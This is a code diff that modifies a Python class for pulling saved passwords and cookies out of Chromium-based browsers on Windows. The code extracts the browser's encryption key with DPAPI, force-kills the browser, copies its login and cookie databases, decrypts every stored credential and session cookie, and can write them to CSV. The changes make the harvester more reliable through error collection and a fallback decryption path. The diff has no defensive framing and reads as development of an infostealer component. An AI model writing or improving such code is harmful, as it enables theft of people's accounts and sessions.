@@ -23,7 +23,11 @@ class browser:
             if not os.path.exists(i[1]):
                 self.browsers.remove(i)
             else:
-                i.append(self.GetAESKey(i[1] + r"\Local State"))
+                key=self.GetAESKey(i[1] + r"\Local State")
+                if key:
+                    i.append(key)
+                else:
+                    self.browsers.remove(i)
     
     def GetAESKey(self,local_state_path):
         try:
@@ -31,20 +35,27 @@ class browser:
                 local_state = f.read()
                 local_state = json.loads(local_state)
             secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            secret_key = secret_key[5:] 
+            secret_key = secret_key[5:]
             secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
             return secret_key
         except Exception as e:
             return None
 
-    def DecryptData(self, secret_key,iv,encrypted_data):
+    def DecryptData(self, secret_key, ciphertext):
         try:
+            iv = ciphertext[3:15]
+            encrypted_data = ciphertext[15:]
             cipher = AES.new(secret_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(encrypted_data)
-            decrypted_pass = decrypted_pass.decode() 
-            return decrypted_pass
+            decrypted_data = cipher.decrypt(encrypted_data)[:-16]
+            try:
+                return decrypted_data.decode('utf-8')
+            except UnicodeDecodeError:
+                return decrypted_data.hex()
         except Exception as e:
-            return ""
+            try:
+                return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
+            except Exception as e:
+                return f"[Decryption error: {str(e)}]"
         
     def GetDBConnection(self,chrome_path,filename):
         try:
@@ -56,6 +67,7 @@ class browser:
     
     def GetPasswords(self):
         passwords = []
+        errors = []
         for browser_name,browser_path,secret_key in self.browsers:
             try:
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
@@ -63,25 +75,28 @@ class browser:
                     chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
                     self.KillBrowser(browser_name)
                     conn = self.GetDBConnection(chrome_path_login_db,"Loginvault.db")
-                    if(secret_key and conn):
-                        # print(secret_key)
+                    if(conn):
                         cursor = conn.cursor()
                         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                        for index,login in enumerate(cursor.fetchall()):
+                        password_data = cursor.fetchall()
+                        cursor.close()
+                        conn.close()
+                        os.remove("Loginvault.db")
+                        for index,login in enumerate(password_data):
                             url = login[0]
                             username = login[1]
                             ciphertext = login[2]
                             if(username!="" and ciphertext!=""):
-                                decrypted_password = self.DecryptData(secret_key,ciphertext[3:15],ciphertext[15:-16])
+                                decrypted_password = self.DecryptData(secret_key,ciphertext)
                                 passwords.append([browser_name,url, username, decrypted_password])
-                        cursor.close()
-                        conn.close()
-                        os.remove("Loginvault.db")
                     else:
-                        return "[-][ERR] Unable to get secret key or database connection"
+                        errors.append([browser_name,"Error in getting database connection"])
             except Exception as e:
-                return "[-][ERR] %s"%str(e)
-        return passwords
+                errors.append([browser_name,"Error in getting passwords",str(e)])
+        return {
+            "passwords": passwords,
+            "errors": errors
+        }
     
     def GetDatetime(self,chromedate):
         if chromedate != 86400000000 and chromedate:
@@ -91,23 +106,24 @@ class browser:
                 print(f"Error: {e}, chromedate: {chromedate}")
                 return chromedate
         else:
-            return ""
+            return "Expired or Invalid Date"
     
     def KillBrowser(self, browser_name):
         try:
             startupinfo = subprocess.STARTUPINFO()
             startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
             subprocess.call("taskkill /f /im %s" % browser_name, startupinfo=startupinfo)
+            return True
         except Exception as e:
             print("[-][ERR] %s" % str(e))
-        
-    
+            return False
+         
     def GetCookies(self):
         cookies = []
+        errors = []
         for browser_name,browser_path,secret_key in self.browsers:
             try:
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
-                # print(folders)
                 for folder in folders:
                     cookie_db = os.path.normpath(r"%s\%s\Network\Cookies"%(browser_path,folder))
                     self.KillBrowser(browser_name)
@@ -115,38 +131,48 @@ class browser:
                     if(conn):
                         cursor = conn.cursor()
                         cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
-                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
-                            if not value:
-                                decrypted_value = self.DecryptData(secret_key, encrypted_value[3:15], encrypted_value[15:-16])
-                            else:
-                                decrypted_value = value
-                            creation_utc = str(self.GetDatetime(creation_utc))
-                            last_access_utc = str(self.GetDatetime(last_access_utc))
-                            expires_utc = str(self.GetDatetime(expires_utc))
-                            # print(f"host_key: {host_key}, name: {name}, decrypted_value: {decrypted_value}, creation_utc: {creation_utc}, last_access_utc: {last_access_utc}, expires_utc: {expires_utc}")
-                            cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
+                        decrypted_value="something went wrong"
+                        cookies_data = cursor.fetchall()
                         cursor.close()
                         conn.close()
                         os.remove("Cookies.db")
+                        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cookies_data:
+                            if not value:
+                                decrypted_value = self.DecryptData(secret_key, encrypted_value)
+                            else:
+                                decrypted_value = encrypted_value
+                            creation_utc = str(self.GetDatetime(creation_utc))
+                            last_access_utc = str(self.GetDatetime(last_access_utc))
+                            expires_utc = str(self.GetDatetime(expires_utc))
+                            cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                     else:
-                        return "[-][ERR] Unable to get database connection"
+                        errors.append([browser_name,"Error in getting database connection"])
             except Exception as e:
-                return "[-][ERR] %s"%str(e)
-        return cookies
+                errors.append([browser_name,"Error in getting cookies",str(e)])
+        return {
+            "cookies": cookies,
+            "errors": errors
+        }
 
 # import pandas as pd
 # def create_password_csv():
 #     browser_obj = browser()
-#     passwords = browser_obj.GetPasswords()
+#     data = browser_obj.GetPasswords()
+#     passwords=data["passwords"]
+#     errors=data["errors"]
+#     print(errors)
 #     if type(passwords) == str:
 #         return passwords
 #     df = pd.DataFrame(passwords, columns=["Browser", "URL", "Username", "Password"])
 #     df.to_csv("passwords.csv", index=False)
-#     return "Password file created successfully"
+#     return "Passwords file created successfully"
 
 # def create_cookies_csv():
 #     browser_obj = browser()
-#     cookies = browser_obj.GetCookies()
+#     data = browser_obj.GetCookies()
+#     cookies=data["cookies"]
+#     errors=data["errors"]
+#     print(errors)
 #     if type(cookies) == str:
 #         return cookies
 #     df = pd.DataFrame(cookies, columns=["Browser", "Host Key", "Name", "Value", "Creation UTC", "Last Access UTC", "Expires UTC"])
